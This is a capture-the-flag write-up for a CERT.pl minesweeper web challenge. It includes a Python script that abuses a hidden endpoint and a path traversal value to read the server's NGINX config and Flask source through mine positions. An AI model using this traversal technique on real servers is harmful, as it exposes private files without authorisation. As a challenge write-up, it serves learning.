# Easy Minesweeper
Problem: https://hack.cert.pl/challenge/easy-minesweeper

_Easy Minesweeper_ is quite an interesting problem, although solving it involved a lot of guesswork. Maybe somebody else has come up with a better solution...

In the problem we are given a simple Minesweeper game, the objective is to solve the `flag` board. Of course one could try to actually solve the puzzle, but that would take far to long and it would beat the purpose of the challenge. Upon viewing the source code of the game, I quickly discovered an initially inactive endpoint `get_mines`, which returns the positions of the mines on the board. I also noticed that all of the requests to the game's endpoints were unnaturally slow (reaching even 7 seconds per request) so solving the board automatically using the mentioned above mine positions would take far to long (and it turns out that such a solution would be impossible, more on that later).

To automate my work I wrote a simple Python script that maintains a persistent session and sends the necessary requests:
```python
import requests, json

baseUrl = "https://web-minesweeper1.ecsc18.hack.cert.pl/"

sess = requests.Session()

def init_board(boardType):
	request = sess.post(baseUrl + "init_board", data={ "board": boardType })
	return json.loads(request.text)

def get_mines():
	request = sess.post(baseUrl + "get_mines")
	return json.loads(request.text)["mines"]
```

After playing around with the website for a little while, I suddenly realized that maybe the solution (which is a string of ones and zeros) is actually the binary representation of the given file. I tried out my theory with `static/style.css` and sure enough, when I created a string made up of ones and zeroes and the positions of the ones corresponded to the positions of the mines on the board (obtained from the `/get_mines` endpoint) and then converted that binary string to ASCII, I received the contents of the `static/style.css` file. Intrigued with that discovery, I quickly started testing other files, including the NGINX configuration file.

```python
board = init_board("../../../../../../../etc/nginx/conf.d/nginx.conf")
mines = get_mines()

s = list("0" * (board["width"] * board["height"]))

for mine in mines:
	s[mine] = '1'

print("".join(s))
```

The configuration file revealed that the main directory of the webapp was `/app` and after some trial and error I discovered that the Flask server was located at `/app/app.py`. After getting the contents of that file using the same method as above, I found the flag in the source code.

## Analysis of the source code
I mentioned at the beginning that a possible solution would be to click only the fields that do not contain mines using the locations of the mines obtained from `/get_mines`. It turns out that such a solution is impossible, because of this:
```python
@app.route('/get_mines', methods=['POST'])
def get_mines():
    ...
    session['failed'] = True
    ...
```

One might try to first get the flag board solution and then submit the solution from a new session, but that also is not possible, because the flag board solution is different for each session:
```python
if board == 'flag':
        board_width, board_data = parse_board(chr(32) + os.urandom(4 * 32))
    else:
        board_width, board_data = load_board('boards/%s' % board)
```
